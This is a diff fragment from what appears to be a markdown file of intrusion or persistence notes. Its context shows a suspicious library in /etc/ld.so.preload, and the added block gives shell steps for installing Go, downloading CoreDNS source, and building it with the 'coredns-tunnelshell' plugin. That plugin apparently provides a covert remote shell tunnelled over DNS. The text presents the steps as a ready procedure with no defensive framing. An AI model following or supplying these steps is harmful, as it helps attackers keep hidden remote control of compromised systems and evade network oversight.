@@ -33,3 +33,34 @@ cat /etc/ld.so.preload
 /lib/x86_64-linux-gnu/zlibcnss.so
 ```
 
+```
+wget https://golang.org/dl/go1.17.4.linux-amd64.tar.gz
+tar -zxvf go1.17.4.linux-amd64.tar.gz -C /usr/local/
+ln -s /usr/local/go/bin/go /usr/bin/go
+
+cat >> /etc/profile <<EOF
+export GOROOT=/usr/local/go
+export GOBIN=$GOROOT/bin
+export PATH=$PATH:$GOBIN
+export GOPATH=/home/gopath
+EOF
+mkdir /home/gopath
+source /etc/profile
+go version
+
+wget https://github.com/coredns/coredns/archive/refs/tags/v1.8.6.tar.gz
+tar zxvf v1.8.6.tar.gz && cd coredns-1.8.6
+
+
+echo tunnelshell:github.com/adc/coredns-tunnelshell >> plugin.cfg
+#plugin.cfg hosts:hosts tunnelshell:github.com/adc/coredns-tunnelshell
+
+go get github.com/adc/coredns-tunnelshell
+go generate
+go build
+make
+
+./coredns -plugins
+
+```
+
